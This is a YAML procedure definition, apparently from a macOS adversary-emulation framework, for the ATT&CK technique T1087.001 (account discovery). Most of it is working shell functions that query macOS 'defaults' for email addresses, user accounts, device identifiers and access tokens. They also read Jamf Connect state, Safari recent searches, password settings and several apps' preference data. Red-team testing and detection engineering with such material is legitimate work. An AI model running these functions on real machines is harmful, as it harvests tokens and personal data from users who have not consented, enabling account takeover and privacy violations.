procedure_name: find_account_defaults
ttp_id: T1087.001
tactic: Discovery
guid: 385131b8-89a2-4764-8e30-4f0e9a2946bc
intent: Find account information and user data using defaults read commands to search
  application preferences and system settings
author: '@darmado | https://x.com/darmad0'
version: 1.0.0
created: '2025-01-27'
updated: '2025-05-30'
procedure:
  arguments:
  - option: --email-search
    description: Search for email addresses in defaults
    execute_function:
    - find_email_addresses
  - option: --account-search
    description: Search for user accounts and device IDs
    execute_function:
    - find_user_accounts
  - option: --app-data
    description: Search application preferences for user data
    execute_function:
    - find_app_user_data
  - option: --all
    description: Run all account discovery searches
    execute_function:
    - find_email_addresses
    - find_user_accounts
    - find_app_user_data
  global_variable:
  - name: CMD_DEFAULTS
    type: string
    default_value: defaults
  functions:
  - name: find_email_addresses
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
    code: "find_email_addresses() {\n    $CMD_PRINTF \"SEARCH_TYPE|COMMAND|RESULT\\\
      n\"\n    \n    # Find email addresses\n    local email_result\n    email_result=$($CMD_DEFAULTS\
      \ find EmailAddress 2>/dev/null)\n    if [ -n \"$email_result\" ]; then\n  \
      \      $CMD_PRINTF \"EMAIL|defaults find EmailAddress|%s\\n\" \"$email_result\"\
      \n    fi\n    \n    # Find owner email addresses\n    local owner_result\n \
      \   owner_result=$($CMD_DEFAULTS find OwnerEmailAddress 2>/dev/null)\n    if\
      \ [ -n \"$owner_result\" ]; then\n        $CMD_PRINTF \"OWNER_EMAIL|defaults\
      \ find OwnerEmailAddress|%s\\n\" \"$owner_result\"\n    fi\n    \n    # Grammarly\
      \ email data\n    local grammarly_result\n    grammarly_result=$($CMD_DEFAULTS\
      \ read com.grammarly.ProjectLlama 2>/dev/null)\n    if [ -n \"$grammarly_result\"\
      \ ]; then\n        $CMD_PRINTF \"GRAMMARLY_DATA|defaults read com.grammarly.ProjectLlama|%s\\\
      n\" \"$grammarly_result\"\n    fi\n    \n    return 0\n}\n"
  - name: find_user_accounts
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
    code: "find_user_accounts() {\n    $CMD_PRINTF \"SEARCH_TYPE|COMMAND|RESULT\\\
      n\"\n    \n    # Find user accounts\n    local account_result\n    account_result=$($CMD_DEFAULTS\
      \ find userAccount 2>/dev/null)\n    if [ -n \"$account_result\" ]; then\n \
      \       $CMD_PRINTF \"USER_ACCOUNT|defaults find userAccount|%s\\n\" \"$account_result\"\
      \n    fi\n    \n    # Find device identifiers\n    local device_result\n   \
      \ device_result=$($CMD_DEFAULTS find DeviceIdentifier 2>/dev/null)\n    if [\
      \ -n \"$device_result\" ]; then\n        $CMD_PRINTF \"DEVICE_ID|defaults find\
      \ DeviceIdentifier|%s\\n\" \"$device_result\"\n    fi\n    \n    # Find access\
      \ tokens\n    local token_result\n    token_result=$($CMD_DEFAULTS find access_token\
      \ 2>/dev/null | sed 's/\\\\\\\\//g')\n    if [ -n \"$token_result\" ]; then\n\
      \        $CMD_PRINTF \"ACCESS_TOKEN|defaults find access_token|%s\\n\" \"$token_result\"\
      \n    fi\n    \n    # JAMF state\n    local jamf_result\n    jamf_result=$($CMD_DEFAULTS\
      \ read com.jamf.connect.state 2>/dev/null)\n    if [ -n \"$jamf_result\" ];\
      \ then\n        $CMD_PRINTF \"JAMF_STATE|defaults read com.jamf.connect.state|%s\\\
      n\" \"$jamf_result\"\n    fi\n    \n    return 0\n}\n"
  - name: find_app_user_data
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
    code: "find_app_user_data() {\n    $CMD_PRINTF \"SEARCH_TYPE|COMMAND|RESULT\\\
      n\"\n    \n    # Safari data\n    local safari_searches\n    safari_searches=$($CMD_DEFAULTS\
      \ read com.apple.Safari RecentWebSearches 2>/dev/null)\n    if [ -n \"$safari_searches\"\
      \ ]; then\n        $CMD_PRINTF \"SAFARI_SEARCHES|defaults read com.apple.Safari\
      \ RecentWebSearches|%s\\n\" \"$safari_searches\"\n    fi\n    \n    # Password\
      \ settings\n    local password_settings\n    password_settings=$($CMD_DEFAULTS\
      \ read com.apple.Passwords-Settings.extension 2>/dev/null)\n    if [ -n \"$password_settings\"\
      \ ]; then\n        $CMD_PRINTF \"PASSWORD_SETTINGS|defaults read com.apple.Passwords-Settings.extension|%s\\\
      n\" \"$password_settings\"\n    fi\n    \n    # Microsoft To-Do\n    local todo_result\n\
      \    todo_result=$($CMD_DEFAULTS read com.microsoft.to-do-mac 2>/dev/null)\n\
      \    if [ -n \"$todo_result\" ]; then\n        $CMD_PRINTF \"TODO_DATA|defaults\
      \ read com.microsoft.to-do-mac|%s\\n\" \"$todo_result\"\n    fi\n    \n    #\
      \ CapCut data\n    local capcut_result\n    capcut_result=$($CMD_DEFAULTS read\
      \ com.lemon.lvoverseas 2>/dev/null)\n    if [ -n \"$capcut_result\" ]; then\n\
      \        $CMD_PRINTF \"CAPCUT_DATA|defaults read com.lemon.lvoverseas|%s\\n\"\
      \ \"$capcut_result\"\n    fi\n    \n    # Google Drive settings\n    local gdrive_result\n\
      \    gdrive_result=$($CMD_DEFAULTS read com.google.drivefs.settings 2>/dev/null)\n\
      \    if [ -n \"$gdrive_result\" ]; then\n        $CMD_PRINTF \"GDRIVE_SETTINGS|defaults\
      \ read com.google.drivefs.settings|%s\\n\" \"$gdrive_result\"\n    fi\n    \n\
      \    # Mail settings\n    local mail_result\n    mail_result=$($CMD_DEFAULTS\
      \ read com.apple.mail 2>/dev/null)\n    if [ -n \"$mail_result\" ]; then\n \
      \       $CMD_PRINTF \"MAIL_SETTINGS|defaults read com.apple.mail|%s\\n\" \"\
      $mail_result\"\n    fi\n    \n    # Notification Center preferences\n    local\
      \ ncprefs_result\n    ncprefs_result=$($CMD_DEFAULTS read com.apple.ncprefs\
      \ 2>/dev/null)\n    if [ -n \"$ncprefs_result\" ]; then\n        $CMD_PRINTF\
      \ \"NOTIFICATION_PREFS|defaults read com.apple.ncprefs|%s\\n\" \"$ncprefs_result\"\
      \n    fi\n    \n    return 0\n} "
